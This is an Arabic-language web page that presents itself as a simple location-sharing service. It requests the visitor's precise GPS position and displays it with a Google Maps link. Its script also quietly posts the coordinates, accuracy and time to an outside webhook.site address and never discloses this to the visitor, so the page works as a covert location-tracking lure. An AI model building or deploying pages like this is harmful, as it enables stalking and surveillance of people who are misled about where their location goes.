<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الموقع الجغرافي</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f9;
            margin: 0;
            padding: 50px;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: auto;
        }
        button {
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        #result {
            margin-top: 20px;
            font-size: 15px;
            color: #333;
            line-height: 1.6;
        }
        a {
            color: #28a745;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>مشاركة الموقع</h2>
        <p>نحتاج إلى إذنك للوصول إلى موقعك الجغرافي لتقديم الخدمة المطلوبة.</p>
        
        <button onclick="getLocation()">مشاركة موقعي الآن</button>
        
        <div id="result"></div>
    </div>

    <script>
        const resultDiv = document.getElementById("result");

        function getLocation() {
            resultDiv.innerHTML = "<i>جاري طلب الإذن وتحديد الموقع... يرجى الضغط على 'السماح' (Allow) في النافذة المنبثقة.</i>";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                resultDiv.innerHTML = "<span style='color:red;'>عذراً، متصفحك لا يدعم ميزة تحديد الموقع.</span>";
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // عرض النتيجة للمستخدم
            resultDiv.innerHTML = 
                "<span style='color:green;'><b>تم تحديد الموقع بنجاح!</b></span><br>" +
                "خط العرض: " + lat + "<br>" +
                "خط الطول: " + lon + "<br>" +
                "<a href='https://www.google.com/maps?q=" + lat + "," + lon + "' target='_blank'>🌍 عرض الموقع على خرائط جوجل</a>";
            
            // تجهيز البيانات
            const dataToSend = {
                latitude: lat,
                longitude: lon,
                accuracy_meters: accuracy,
                google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
                time: new Date().toLocaleString()
            };

            // رابط Webhook الخاص بك
            const webhookUrl = "https://webhook.site/202708d5-6038-426d-a1ac-e0e86943b987";

            // إرسال البيانات
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(dataToSend)
            })
            .then(response => console.log("تم إرسال البيانات بنجاح"))
            .catch(error => console.error("حدث خطأ أثناء الإرسال", error));
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    resultDiv.innerHTML = "<span style='color:red;'>تم رفض الإذن. لا يمكننا تحديد موقعك إلا بموافقتك.</span>";
                    break;
                case error.POSITION_UNAVAILABLE:
                    resultDiv.innerHTML = "<span style='color:red;'>معلومات الموقع غير متوفرة حالياً (قد يكون الـ GPS مغلقاً).</span>";
                    break;
                case error.TIMEOUT:
                    resultDiv.innerHTML = "<span style='color:red;'>انتهى وقت الطلب دون استجابة من النظام.</span>";
                    break;
                case error.UNKNOWN_ERROR:
                    resultDiv.innerHTML = "<span style='color:red;'>حدث خطأ غير معروف.</span>";
                    break;
            }
        }
    </script>
</body>
</html>
